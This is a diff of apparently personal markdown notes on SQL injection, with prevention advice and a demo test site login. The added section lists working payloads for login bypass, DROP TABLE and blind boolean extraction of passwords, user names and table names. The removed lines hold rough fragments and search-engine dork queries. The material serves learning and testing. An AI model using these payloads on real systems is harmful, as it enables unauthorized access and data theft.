@@ -4,43 +4,6 @@
 
 **SQL injection \(SQLi\)** is an application security weakness that allows attackers to control an application’s database – letting them access or delete data, change an application’s data-driven behavior, and do other undesirable things – by tricking the application into sending unexpected SQL commands. SQL injections are among the most frequent threats to data security.
 
-## Login Page SQL Injection
-
-To check for potential SQL injection vulnerabilities we have entered a single quote in to the "Name" field and submitted the request using the "Login" button.
-
-## How to Prevent against SQL Injection Attacks
-
-An organization can adopt the following policy to protect itself against SQL Injection attacks.
-
-* **User input should never be trusted -** It must always be sanitized before it is used in dynamic SQL statements.
-* **Stored procedures –** these can encapsulate the SQL statements and treat all input as parameters.
-* **Prepared statements –**prepared statements to work by creating the SQL statement first then treating all submitted user data as parameters. This has no effect on the syntax of the SQL statement.
-* **Regular expressions –**these can be used to detect potential harmful code and remove it before executing the SQL statements.
-* **Database connection user access rights –**only necessary access rights should be given to accounts used to connect to the database. This can help reduce what the SQL statements can perform on the server.
-* **Error messages –**these should not reveal sensitive information and where exactly an error occurred. Simple custom error messages such as “Sorry, we are experiencing technical errors. The technical team has been contacted. Please try again later” can be used instead of display the SQL statements that caused the error.
-
-script that executes on open that would ping alternate server on a console.log
-
-scan to see if document has 
-
-4 or 5 
-
-sql injects url browser
-
-document with active link
-
-can 
-
-
-
-Finding the vulnerability in a website
-
-inurl:faq.php
-
-intitle:"sign in"
-
-
-
 {% embed url="http://demo.testfire.net/" %}
 
 username: jsmith
@@ -82,4 +45,93 @@ password: demo1234
 9. **Permanently maintain SQL statements from database-connected apps:** This will provide to detect fake SQL vulnerabilities and comments. Supervising tools that exploit computer learning or behavioral analyses can be beneficial.
 10. **Don't forget the basics:** Change the passwords of application accounts into the database regularly. This is common sense, but in practice these passwords often stay unchanged for months or even years.
 11. **Use better software:** Make coders responsible for checking the code and for fixing security flaws in custom applications before the software is delivered.
+
+consider that we have a query, that is searching for the entered word in the database table:
+
+_**select \* from notes nt where nt.subject = ‘search\_word‘;**_
+
+Therefore instead of the search word, if we enter a SQL Injection query ‘ or 1=1;–, then the query will become always true.
+
+_**select \* from notes nt where nt.subject = ‘ ‘ or 1=1;–**_
+
+In this case, the parameter “subject“ is closed with the quote and then we have code or 1=1, which makes a query always true. With the sign “–“ we comment the rest of the query code, which will not be executed. It is one of the most popular and easiest ways to start controlling the query.
+
+* ‘ or ‘abc‘=‘abc‘;–
+* ‘ or ‘ ‘=‘ ‘;–
+
+The most important part here is that after comma sign we can enter any malicious code, that we would like to be executed.
+
+## **Login Page**
+
+If the application has a login page, it is possible that the application uses a dynamic SQL such as the statement below. This statement is expected to return at least a single row with the user details from the Users table as the result set when there is a row with the username and password entered in the SQL statement.
+
+`SELECT * FROM Users WHERE User_Name = ‘” & strUserName & “‘ AND Password = ‘” & strPassword & “’;”`
+
+If the tester would enter John’; DROP table users\_details;’—as strUserName and anything as strPassword, the SQL statement would become like the one below.
+
+`SELECT * FROM Users WHERE User_Name = ‘John’; DROP table users_details;’ –‘ AND Password = ‘Smith';`
+
+**To gain access and find a user name.** Enter the string  as both user name and password in the frame on the right. This should get you logged in as a user \(jake happens to be the first user in the table\). This tells you that Jake is a user and it allows you to access his account - but it does not tell you his password.
+
+**Find out if Jake's password includes the letter "w".** Enter `xxx` as user name and enter the following string as the password:
+
+`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='`
+
+**Find out if Jake's password has "w" as the third letter.** Enter `xxx` as user name and enter the following string as the password: 
+
+`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '__w%') AND ''='`
+
+## Force an Error
+
+If you enter a string with a single quote in it such as `O'Brien` for either user name or password you will get a Software Error as the SQL is invalid and cannot be parsed.
+
+### Force Entry
+
+If you enter the string `' OR ''='` as both user name and password you can ensure that the WHERE clause always returns true. Without knowing any user names or passwords you can by-pass the log in screen. In this example you get the user name of the first person in the table.
+
+The magic string works because it program evaluates:
+
+```text
+SELECT name from users WHERE name='name' AND password='password'
+```
+
+as the 'always true' string:
+
+```text
+SELECT name from users WHERE name='' OR ''='' AND password='' OR ''=''
+```
+
+## Find a password using SQL Injection
+
+You can now get the system to answer questions about the password table. It will only ever answer yes \(and let you in\) or no \(by refusing entry\). Your questions must take the form of a valid SQL query. In each case use a `xx` for the user name and the text shown as password. You can ask questions such as:Does jake's password have a w in it?
+
+`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='`Does jake's password start with w?`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE 'w%') AND ''='`Does jake's password have an w followed by d?`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%d`%'\) AND ''='Is the fourth letter of jake's password w?`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '___w%') AND ''='`
+
+This works because the LIKE command uses % and \_ as wildcards. The % wildcard matches any string, the \_ wildcard matches a single character.
+
+## Find a user names using SQL Injection Work space:
+
+Are there more than 10 rows in the password table?`' OR (SELECT COUNT(*) FROM users)>10 AND ''='`
+
+Is there a user with an r in his name?`' OR EXISTS(SELECT * FROM users WHERE name LIKE '%r%') AND ''='`
+
+Is there a user \(other than jake\) with an a in his name?`' OR EXISTS(SELECT * FROM users WHERE name!='jake' AND name LIKE '%a%') AND ''='`
+
+## Find Table Names using SQL Injection ``Work space:
+
+You need to find out the name of the database that you are using. The function DATABASE\(\) will give you that value \(but you have to guess at it as before\). When you know the name of the database being used you can take guesses at the names of the tables. 
+
+Does the current database contain the letter j?
+
+`' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%j%') AND ''='`
+
+Is there a table called `one` in database test?
+
+`' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME='one') AND ''='`
+
+Is there more than one table in the database\(s\) containing a j?
+
+`' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%j%')>1 AND ''='`
+
+## 
 
